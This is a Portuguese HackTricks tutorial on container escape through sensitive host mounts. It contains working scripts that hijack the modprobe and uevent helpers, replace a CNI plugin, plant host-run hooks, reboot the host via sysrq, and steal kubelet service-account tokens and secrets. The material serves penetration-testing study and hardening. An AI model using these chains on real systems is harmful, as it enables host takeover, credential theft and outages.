# Montagens sensíveis do host

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

As montagens do host estão entre as superfícies práticas mais importantes para escapar de containers, pois muitas vezes desfazem o isolamento cuidadoso da visão de um processo e voltam a expor diretamente recursos do host. Os casos perigosos não se limitam a `/`. Bind mounts de `/proc`, `/sys`, `/var`, sockets de runtime, estado gerenciado pelo kubelet ou caminhos relacionados a dispositivos podem expor controles do kernel, credenciais, sistemas de arquivos de containers vizinhos e interfaces de gerenciamento do runtime.

Esta página existe separadamente das páginas sobre proteções individuais porque o modelo de abuso atravessa várias áreas. Uma montagem gravável do host é perigosa em parte por causa dos mount namespaces, em parte por causa dos user namespaces, em parte pela cobertura do AppArmor ou SELinux e em parte pelo caminho exato do host que foi exposto. Tratá-la como um tópico próprio facilita muito a análise da superfície de ataque.

Compare também um diretório gravável no host com o caminho correspondente dentro de cada container. Se estiver montado sobre um diretório de scripts executáveis de inicialização, um usuário do host com menos privilégios poderá inserir código que o entrypoint de um container com mais privilégios carregue na próxima reinicialização. Confirme a origem e o destino exatos do bind, as permissões de escrita e busca do diretório, o loop do entrypoint e o requisito de arquivo executável, o UID do runtime e um gatilho real de reinicialização. O UID 0 do container não é automaticamente o UID 0 do host; o mapeamento de user namespace e a política de montagem determinam o efeito no host. Uma análise passiva deve relatar caminhos e permissões sem gravar um script nem reiniciar a carga de trabalho.

Um container Linux pode estar dentro de uma VM de gerenciamento que compartilha parte do sistema de arquivos de um host Windows separado. [Pastas compartilhadas do VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) são uma forma de tornar arquivos do host visíveis na máquina convidada, mas o root nessa VM ainda é uma identidade distinta de um administrador do Windows. Se o compartilhamento expuser a chave privada SSH legível de um usuário, trate-a como uma pista de credencial: verifique a montagem exata respaldada pelo host, a propriedade e o acesso à chave, a conta correspondente e a política **efetiva** de chaves autorizadas do servidor SSH do Windows antes de concluir que ela permite um login no host. O [OpenSSH do Windows](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) moderno costuma usar um arquivo `administrators_authorized_keys` separado para contas de administrador. Não inclua o conteúdo de chaves privadas na saída de enumeração de rotina; os metadados da montagem e do caminho da chave são suficientes para a triagem passiva.

## Exposição de `/proc`

procfs contém tanto informações comuns sobre processos quanto interfaces de controle do kernel de alto impacto. Portanto, um bind mount como `-v /proc:/host/proc` ou uma visão do container que exponha entradas graváveis inesperadas de proc pode levar à divulgação de informações, à negação de serviço ou à execução direta de código no host.

Caminhos de alto valor do procfs incluem:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (especialmente `register` e `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comece verificando quais entradas de alto valor do procfs estão visíveis ou podem ser gravadas:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Esses caminhos são interessantes por diferentes motivos. `core_pattern`, `modprobe` e `binfmt_misc` podem se tornar caminhos de execução de código no host quando são graváveis. `kallsyms`, `kmsg`, `kcore` e `config.gz` são fontes valiosas de reconhecimento para exploração do kernel. `sched_debug` e `mountinfo` revelam o contexto de processos, cgroups e sistemas de arquivos, o que pode ajudar a reconstruir o layout do host a partir do interior do container.

O valor prático de cada caminho é diferente, e tratar todos como se tivessem o mesmo impacto torna a triagem mais difícil:

- `/proc/sys/kernel/core_pattern`
  Se for gravável, este é um dos caminhos de maior impacto em procfs, pois o kernel executa um pipe handler após um crash. Um container que consiga apontar `core_pattern` para um payload armazenado em seu overlay ou em um caminho montado do host muitas vezes pode obter execução de código no host. Veja também [read-only-paths.md](protections/read-only-paths.md) para um exemplo dedicado.
- `/proc/sys/kernel/modprobe`
  Este caminho controla o helper de userspace usado pelo kernel quando precisa invocar a lógica de carregamento de módulos. Se for gravável a partir do container e interpretado no contexto do host, pode se tornar outra primitiva de execução de código no host. É especialmente interessante quando combinado com uma forma de acionar o caminho do helper.
- `/proc/sys/vm/panic_on_oom`
  Geralmente, esta não é uma primitiva de escape limpa, mas pode transformar pressão de memória em negação de serviço em todo o host, convertendo condições de OOM em comportamento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
  Se a interface de registro for gravável, o atacante pode registrar um handler para um valor mágico escolhido e obter execução no contexto do host quando um arquivo correspondente for executado.
- `/proc/config.gz`
  Útil para triagem de exploits do kernel. Ajuda a determinar quais subsistemas, mitigações e recursos opcionais do kernel estão habilitados, sem precisar dos metadados de pacotes do host.
- `/proc/sysrq-trigger`
  Principalmente um caminho de negação de serviço, mas muito sério. Pode reiniciar, causar panic ou interromper o host imediatamente de outra forma.
- `/proc/kmsg`
  Revela mensagens do buffer circular do kernel. Útil para fingerprinting do host, análise de crashes e, em alguns ambientes, para vazar informações úteis à exploração do kernel.
- `/proc/kallsyms`
  Valioso quando legível, pois expõe informações sobre símbolos exportados do kernel e pode ajudar a contornar pressupostos de randomização de endereços durante o desenvolvimento de exploits do kernel.
- `/proc/[pid]/mem`
  Esta é uma interface direta para a memória de processos. Se o processo-alvo puder ser acessado com as condições necessárias do tipo ptrace, ela pode permitir a leitura ou modificação da memória de outro processo. O impacto real depende muito das credenciais, de `hidepid`, do Yama e das restrições de ptrace, portanto é um caminho poderoso, mas condicional.
- `/proc/kcore`
  Expõe uma visão da memória do sistema no estilo de uma imagem de core. O arquivo é enorme e complicado de usar, mas, se for realmente legível, indica uma superfície de memória do host perigosamente exposta.
- `/dev/kmem` e `/dev/mem`
  Historicamente, estas são interfaces de **dispositivo** de memória bruta de alto impacto, não arquivos procfs. Em muitos sistemas modernos, estão ausentes ou são fortemente restritas, mas um container que consiga abrir uma cópia montada do host deve tratar essa exposição como crítica. Verifique-as junto com outras montagens sensíveis de `/dev`, em vez de procurar os caminhos inexistentes `/proc/kmem` ou `/proc/mem`.
- `/proc/sched_debug`
  Vaza informações de agendamento e tarefas que podem expor identidades de processos do host, mesmo quando outras visualizações de processos parecem mais limpas do que o esperado.
- `/proc/[pid]/mountinfo`
  Extremamente útil para reconstruir onde o container realmente está no host, quais caminhos usam overlay e se uma montagem gravável corresponde a conteúdo do host ou apenas à camada do container.

Se `/proc/[pid]/mountinfo` ou os detalhes do overlay estiverem legíveis, use-os para descobrir o caminho do host correspondente ao sistema de arquivos do container:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Esses comandos são úteis porque várias técnicas de execução no host exigem converter um caminho dentro do container no caminho correspondente do ponto de vista do host.

### Exemplo: Preparando um caminho para um helper `modprobe`

Se `/proc/sys/kernel/modprobe` puder ser escrito a partir do container e o caminho do helper for interpretado no contexto do host, ele poderá ser redirecionado para um payload controlado pelo atacante. O diretório upper do overlay precisa ser resolvido no host, e a saída de prova deve ser gravada de volta nessa mesma camada do container visível pelo host, caso o container também não monte o `/tmp` do host:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

O gatilho exato depende do alvo e do comportamento do kernel e não é adivinhado intencionalmente. Restaure o valor original antes de sair do laboratório. O importante é que um caminho auxiliar gravável pode redirecionar uma futura invocação de um helper do kernel para conteúdo de um caminho do host controlado pelo atacante. A ausência de um `upperdir` do overlay, um caminho que o host não consegue resolver, uma montagem de sysctl somente leitura ou um kernel que nunca invoca o helper selecionado interrompe essa cadeia.

### Exemplo completo: Recon do kernel com `kallsyms`, `kmsg` e `config.gz`

Se o objetivo for avaliar a explorabilidade em vez de realizar uma escape imediata:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Esses comandos ajudam a determinar se há informações úteis sobre símbolos visíveis, se mensagens recentes do kernel revelam algum estado interessante e quais recursos ou mitigações do kernel foram compilados. O impacto geralmente não é um escape direto, mas pode reduzir bastante o tempo necessário para a triagem de vulnerabilidades do kernel.

### Exemplo completo: reinicialização do host via SysRq

Se `/proc/sysrq-trigger` permitir gravação e der acesso à visão do host:

```bash
echo b > /proc/sysrq-trigger
```

O efeito é uma reinicialização imediata do host. Este não é um exemplo sutil, mas demonstra claramente que a exposição do procfs pode ser muito mais grave do que a divulgação de informações.

## Exposição de `/sys`

O sysfs expõe grandes quantidades de estado do kernel e dos dispositivos. Alguns caminhos do sysfs são úteis principalmente para fingerprinting, enquanto outros podem afetar a execução de helpers, o comportamento dos dispositivos, a configuração dos módulos de segurança ou o estado do firmware.

Caminhos de alto valor do sysfs incluem:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Esses caminhos são importantes por diferentes motivos. `/sys/class/thermal` pode influenciar o comportamento do gerenciamento térmico e, portanto, a estabilidade do host em ambientes com exposição inadequada. `/sys/kernel/vmcoreinfo` pode fazer leak de informações sobre dumps de falhas e o layout do kernel, que ajudam no fingerprinting de baixo nível do host. `/sys/kernel/security` é a interface `securityfs` usada pelos Linux Security Modules; portanto, o acesso inesperado a ela pode expor ou alterar o estado relacionado a MAC. Os caminhos de variáveis EFI podem afetar as configurações de inicialização armazenadas no firmware, tornando-os muito mais perigosos do que arquivos de configuração comuns. O `debugfs` em `/sys/kernel/debug` é especialmente perigoso porque é intencionalmente uma interface voltada para desenvolvedores, com muito menos expectativas de segurança do que as APIs do kernel destinadas a ambientes de produção protegidos.

Cada entrada do sysfs nesta lista depende do **kernel, da configuração e do hardware**. Nós virtualizados atuais geralmente não incluem `uevent_helper`, variáveis EFI nem entradas de dispositivos térmicos. Registre um caminho ausente como um pré-requisito negativo, em vez de presumir que um exemplo de outro kernel também se aplica.

Comandos úteis para revisar esses caminhos:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

O que torna esses comandos interessantes:

- `/sys/kernel/security` pode revelar se AppArmor, SELinux ou outra superfície de LSM está visível de uma forma que deveria ter permanecido exclusiva do host.
- `/sys/kernel/debug` costuma ser a descoberta mais alarmante deste grupo. Se `debugfs` estiver montado e puder ser lido ou escrito, espere uma ampla superfície voltada ao kernel, cujo risco exato depende dos nós de debug habilitados.
- A exposição de variáveis EFI é menos comum, mas tem alto impacto quando presente, pois afeta configurações respaldadas pelo firmware, e não arquivos comuns de runtime.
- `/sys/class/thermal` é relevante principalmente para a estabilidade do host e a interação com o hardware, não para escapes simples via shell.
- `/sys/kernel/vmcoreinfo` é principalmente uma fonte para identificação do host e análise de falhas, útil para entender o estado de baixo nível do kernel.

### Exemplo completo: `uevent_helper`

`/sys/kernel/uevent_helper` depende do kernel e da configuração e está ausente em muitos sistemas atuais. Se existir, puder ser escrito e houver um gatilho `uevent` utilizável, o kernel poderá executar um helper controlado pelo atacante. A saída de prova deve usar um caminho visível tanto na visão do host quanto na do container:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

O motivo pelo qual isso funciona é que o caminho do helper é interpretado do ponto de vista do host. Quando acionado, o helper é executado no contexto do host, e não dentro do contêiner atual. `/sys/class/mem/null/uevent` é um gatilho concreto em kernels que o expõem; outros dispositivos podem expor seus próprios arquivos `uevent`, mas não escolha um às cegas em hardware real. Restaure o valor original antes de sair do laboratório. Não informe que essa técnica está disponível se o arquivo helper ou um gatilho controlado estiver ausente.

## Exposição de `/var`

Montar o `/var` do host em um contêiner costuma ser subestimado porque não parece tão dramático quanto montar `/`. Na prática, isso pode ser suficiente para acessar sockets de runtime, diretórios de snapshot de contêineres, volumes de pods gerenciados pelo kubelet, tokens de service account projetados e sistemas de arquivos de aplicações próximas. Em nós modernos, `/var` costuma ser onde realmente fica o estado mais interessante dos contêineres do ponto de vista operacional.

### Exemplo de Kubernetes

Um pod com `hostPath: /var` muitas vezes pode ler tokens projetados de outros pods e conteúdo de snapshots overlay:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Esses comandos são úteis porque mostram se o mount expõe apenas dados de aplicação sem grande impacto ou credenciais de cluster de alto impacto. Um token de service account legível pode transformar imediatamente a execução local de código em acesso à API do Kubernetes.

Se o token estiver presente, valide o que ele pode acessar em vez de parar na descoberta do token:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

O impacto aqui pode ser muito maior do que o acesso local ao nó. Um token com permissões RBAC amplas pode transformar um `/var` montado em um comprometimento de todo o cluster.

### Exemplo de Docker e containerd

Em hosts Docker, os dados relevantes costumam estar em `/var/lib/docker`, enquanto em nós Kubernetes que usam containerd podem estar em `/var/lib/containerd` ou em caminhos específicos do snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Se o `/var` montado expuser conteúdo gravável de snapshots de outro workload, o atacante poderá alterar arquivos da aplicação, inserir conteúdo web ou modificar scripts de inicialização sem tocar na configuração do container atual.

Em um **workload descartável de laboratório**, o conteúdo gravável de snapshots pode demonstrar adulteração de aplicações, recuperação de secrets ou movimentação lateral. Primeiro, mapeie o ID do container em execução para o snapshot exato e nunca edite um snapshot não relacionado ou de produção:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Esses comandos são úteis porque mostram as três principais categorias de impacto de um `/var` montado: adulteração de aplicações, recuperação de segredos e movimentação lateral para workloads vizinhos.

Gravações diretas em snapshots ignoram o gerenciamento de estado normal do runtime e podem corromper o container ou destruir evidências. A descoberta somente leitura foi reproduzida localmente no Docker `overlay2`: um marcador gravado em um container descartável vizinho apareceu em `/var/lib/docker/overlay2/<id>/diff/`. Limite a modificação real de snapshots a um container descartável criado para esse teste.

## Estado do Kubelet, plugins e caminhos do CNI

Uma montagem de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` costuma ser exposta por DaemonSets privilegiados, agentes CNI, plugins de nó CSI, operadores de GPU e auxiliares de armazenamento. É fácil descartar essas montagens como "infraestrutura do nó", mas elas ficam diretamente no caminho de execução de novos pods e geralmente contêm credenciais do kubelet, segredos projetados, sockets de registro e binários executáveis de plugins do host.

Alvos de alto valor incluem:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Comandos úteis para revisão:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Por que esses caminhos são importantes:

- `/var/lib/kubelet/pki` pode expor certificados de cliente do kubelet e outras credenciais locais do nó que, dependendo do design do cluster, às vezes podem ser reutilizadas contra o API server ou endpoints TLS voltados ao kubelet.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` geralmente contém tokens de service account projetados e Secrets montados para pods vizinhos no mesmo nó.
- `/var/lib/kubelet/pod-resources/kubelet.sock` é principalmente uma superfície de reconhecimento, mas muito útil: revela quais pods e containers estão usando GPUs, hugepages, dispositivos SR-IOV e outros recursos escassos locais ao nó no momento.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` revelam quais plugins CSI, DRA e de dispositivos estão instalados e com quais sockets o kubelet deve se comunicar. Se esses diretórios puderem ser gravados, em vez de apenas lidos, o achado se torna muito mais grave.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` e `/etc/cni/net.d` ficam diretamente no caminho de configuração da rede dos pods. O acesso de gravação a esses diretórios costuma ser uma primitiva de execução no host com efeito retardado, e não apenas uma exposição de configuração.<sup>[[2]](#references)</sup>

### Exemplo completo: `/opt/cni/bin` com permissão de gravação

Se um diretório de binários CNI do host estiver montado com permissão de leitura e gravação, substituir um plugin pode ser suficiente para obter execução no host na próxima vez que o kubelet criar um sandbox de pod nesse nó:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Isso não é tão imediato quanto um `docker.sock` montado, mas costuma ser mais realista em pods de infraestrutura do Kubernetes comprometidos. O marcador é gravado ao lado do plugin montado para que o container possa recuperá-lo mesmo sem uma montagem de host-root ou de host-`/tmp`. O wrapper preserva os argumentos originais e a entrada padrão; em seguida, o exemplo restaura o binário original. O ponto importante é que o binário modificado é executado posteriormente pelo fluxo de configuração de rede do host, e não pelo container atual. Use apenas um nó descartável, pois um wrapper inválido pode impedir que novos sandboxes de Pod recebam conectividade de rede.

## Soquetes de runtime

Montagens sensíveis do host geralmente incluem soquetes de runtime, em vez de diretórios inteiros. Eles são tão importantes que merecem ser mencionados explicitamente novamente:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Consulte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para ver os fluxos completos de exploração assim que um desses sockets for montado.

Como um padrão rápido de primeira interação:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Se um deles for bem-sucedido, o caminho de um "socket montado" até "iniciar um container irmão mais privilegiado" costuma ser muito mais curto do que qualquer caminho de breakout do kernel.

O mesmo acesso ao daemon também pode estabelecer **persistência no host**. Um container auxiliar com um bind mount gravável da raiz do host pode receber arquivos por meio de `docker cp` e, em seguida, usar `docker exec` para colocar uma chave SSH, uma unidade de serviço ou outro arquivo de persistência no caminho montado do host. O limite de segurança é a autoridade do daemon para criar o mount no host; `docker cp` é apenas uma etapa de preparação. Audite tanto os containers recém-criados quanto as gravações em caminhos de autenticação ou inicialização do host depois que um socket de runtime for exposto.

## Sequestro de Tarefa por Caminho Gravável no Host

Um mount gravável no host não precisa expor `/` para ser perigoso. Se o caminho montado contiver scripts, arquivos de configuração, hooks, plugins ou arquivos consumidos posteriormente por uma tarefa agendada ou serviço do lado do host, o container poderá alterar o que o host executa.

Fluxo genérico de análise:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Se um arquivo gravável for consumido por um processo do host, mantenha o payload simples e observável durante os testes:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

A parte interessante é o limite de confiança: a gravação acontece de dentro do container, mas a execução ocorre depois, no contexto do serviço do host. Isso transforma um hostPath ou bind mount restrito em uma primitiva de execução tardia de código no host.

## Arquivos Pertencentes ao Root em um Caminho Compartilhado do Host

Uma conta do container que consiga se tornar root pode conseguir colocar um arquivo pertencente ao root em um caminho gravável também usado pelo host. Se o UID 0 do container corresponder ao UID 0 do host, ambas as visualizações se referem ao mesmo arquivo e a montagem do host permitir execução SUID, um usuário do host que consiga executar nesse caminho um executável SUID pertencente ao root poderá cruzar o limite de privilégios do host. Para esse problema específico de propriedade de arquivos, não é necessário que o container seja executado com `--privileged`. Consulte [mapeamentos de user namespace](protections/namespaces/user-namespace.md) e a [discussão sobre SUID](privileged-containers.md) para conhecer as condições distintas.

Analise o caminho **dos dois lados**: compare a propriedade e a identidade de um arquivo inofensivo, confira `uid_map` e `gid_map` do container e inspecione as opções de montagem e a política de execução do host. `rw` no lado do container sem `nosuid` é apenas um candidato; isso não permite estabelecer a propriedade no host, as flags de montagem do host, o acesso de um usuário do host ou se AppArmor/SELinux bloqueia a execução. `noexec` restringe a execução na visualização em que se aplica. As tags `shared:` e `master:` em `/proc/self/mountinfo` descrevem a propagação da montagem, não se o conteúdo do arquivo é compartilhado com o host. Um bind mount pode não ter essas tags. A reutilização de credenciais que fornece um login no host é uma etapa distinta do limite de privilégios do arquivo compartilhado.

O armazenamento de runtime do host pode criar um caminho semelhante mesmo sem um bind mount explícito. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) permitia que um usuário não privilegiado do host atravessasse subdiretórios de dados do Docker e executasse arquivos de um filesystem de container; o Moby corrigiu as permissões na versão 20.10.9 e observa que os containers em execução precisam ser reiniciados para que seus diretórios sejam corrigidos. Analise os caminhos exatos de montagem `overlay2/<id>/merged` e a permissão de busca de cada diretório pai; em seguida, confirme se o UID 0 do container corresponde ao UID 0 do host, se há um executável SetUID pertencente ao root e acessível e se a visualização do host permite a execução de SetUID. Containers rootless ou com user namespace remapeado, `nosuid`, `noexec`, `no_new_privs` e a política MAC podem alterar o resultado. Uma versão do runtime ou um caminho atravessável são apenas pistas para revisão, não provas de execução como root no host; inspecione os metadados da montagem e do arquivo sem executar um possível candidato.

## CVEs Relacionadas a Mounts

Montagens do host também se relacionam com vulnerabilidades de runtime. Entre os exemplos recentes importantes estão:

- `CVE-2024-21626` no `runc`, em que um file descriptor de diretório vazado podia posicionar o diretório de trabalho no filesystem do host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` no BuildKit, em que Dockerfiles maliciosos, frontends e fluxos `RUN --mount` podiam reintroduzir acesso a arquivos do host, exclusão ou privilégios elevados durante builds.
- `CVE-2024-1753` nos fluxos de build do Buildah e Podman, em que bind mounts criados durante o build podiam expor `/` com acesso de leitura e gravação.
- `CVE-2025-47290` no `containerd` 2.1.0, em que uma condição TOCTOU durante a descompactação de uma imagem podia permitir que uma imagem especialmente criada modificasse o filesystem do host durante o pull.

Essas CVEs são relevantes aqui porque mostram que o tratamento de mounts não depende apenas da configuração do operador. O próprio runtime também pode introduzir condições de escape induzidas por mounts.

## Verificações

Use estes comandos para localizar rapidamente as exposições de mounts de maior impacto:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

O que é interessante aqui:

- O root do host, `/proc`, `/sys`, `/var` e os sockets de runtime são todos achados de alta prioridade.
- Entradas graváveis em proc/sys geralmente significam que a montagem expõe controles globais do kernel do host, em vez de uma visão segura do container.
- Caminhos de `/var` montados merecem uma análise de credenciais e workloads vizinhos, não apenas do sistema de arquivos.
- Diretórios de estado do Kubelet e caminhos de CNI/plugins merecem a mesma prioridade que os sockets de runtime, pois costumam estar diretamente no caminho de criação de pods e distribuição de credenciais do nó.

## Status da validação local

As cadeias práticas desta página foram verificadas em um nó Linux minikube local. A validação reproduziu:

- acesso de leitura e escrita por meio de um hostPath gravável temporário
- descoberta de tokens ServiceAccount projetados e Secrets montados por meio de `/var/lib/kubelet/pods`
- autenticação bem-sucedida na API do Kubernetes com um token ativo recuperado desse estado montado do Kubelet
- descoberta somente para leitura de um sistema de arquivos `overlay2` de Docker de um workload vizinho por meio de `/var` montado
- criação de um container irmão pela API do Docker, com uma montagem bind do host somente para leitura, por meio de um `docker.sock` montado
- execução atrasada no host por meio de um hook temporário consumido pelo host
- uma simulação de wrapper de CNI que preservou os argumentos, a entrada padrão e a execução do plugin original

O mesmo nó expôs `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` e `config.gz`, mas não expôs `uevent_helper`, variáveis EFI, entradas térmicas nem `sched_debug`. Gatilhos destrutivos do kernel não foram executados. Isso confirma que as cadeias envolvendo root do host, `/var`, estado do Kubelet, sockets e consumidores do host são reproduzíveis, enquanto as técnicas auxiliares de procfs/sysfs devem permanecer condicionais ao kernel exato, ao modo de montagem, ao caminho do payload e ao gatilho.

## References

- [1] [Arquivos e caminhos locais usados pelo Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [O container cilium-agent pode acessar o host por meio de uma montagem `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
